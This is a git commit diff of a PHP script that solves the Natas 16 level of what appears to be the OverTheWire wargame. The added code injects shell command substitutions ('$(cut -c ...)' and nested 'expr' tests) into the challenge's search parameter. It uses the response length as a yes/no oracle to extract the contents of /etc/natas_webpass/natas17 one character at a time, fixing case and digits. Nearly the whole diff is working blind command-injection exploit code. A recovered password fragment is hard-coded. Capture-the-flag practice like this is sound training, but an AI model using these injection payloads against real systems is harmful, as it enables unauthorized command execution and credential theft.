ff6b25ff1c81c690f2fe4441afe90dd48ee4dffb
filin <filin@syneforge.com>
2023-03-01 22:33:38 +0200

    natas16

--- natas16/curl.php
+++ natas16/curl.php
@@ -11,6 +11,18 @@ $curl = function ($injectionString) use ($argv) {
     return $output;
 };
 
+$curlBoolCheck = function ($injectionString) use ($curl, $argv) {
+    $output = $curl($injectionString);
+    if (strpos($output, "<pre>\n</pre>") !== false) {
+        return false;
+    }
+    $output = substr($output, strpos($output, '<pre>') + 6); //+\n
+    $output = substr($output, 0, strpos($output, '</pre>') - 1); //-\n
+    $dictionary = explode("\n", $output);
+
+    return count($dictionary) !== 50253; //total dictionary lines count
+};
+
 $findNextSymbol = function ($injectionString) use ($curl) {
     $output = $curl($injectionString);
     if (strpos($output, "<pre>\n</pre>") !== false) {
@@ -40,13 +52,32 @@ $findNextSymbol = function ($injectionString) use ($curl) {
     return array_shift($commonCharacters);
 };
 
-$password = '';
-//$password = 'xkeuche_sbnkbvh_ru_ksib_uulmi_sd';
+$roughPassword = '';
+$roughPassword = 'xkeuche_sbnkbvh_ru_ksib_uulmi_sd';
 do {
-    $position = strlen($password) + 1;
+    $position = strlen($roughPassword) + 1;
     $injectionString = "$(cut -c $position /etc/natas_webpass/natas17)";
     $nextCharacter = $findNextSymbol($injectionString);
-    $password .= $nextCharacter;
-    echo "$password\n";
+    $roughPassword .= $nextCharacter;
+    echo "$roughPassword\n";
 } while ($nextCharacter);
 
+$password = '';
+foreach (str_split($roughPassword) as $index => $char) {
+    $position = $index + 1;
+    $passwordSymbolCutExpr = "$(cut -c $position /etc/natas_webpass/natas17)";
+    if ($char === '_') {
+        for ($digit = 0; $digit <= 9; $digit++) {
+            $injectionString = "$(expr substr a $(expr $digit = $passwordSymbolCutExpr) 1)";
+            if ($curlBoolCheck($injectionString)) {
+                $char = $digit;
+            }
+        }
+    } else {
+        $injectionString = "$(expr substr a $(expr $char = $passwordSymbolCutExpr) 1)"; //case sensitive
+        $char = $curlBoolCheck($injectionString) ? $char : strtoupper($char);
+    }
+
+    $password .= $char;
+    echo $password . "\n";
+}
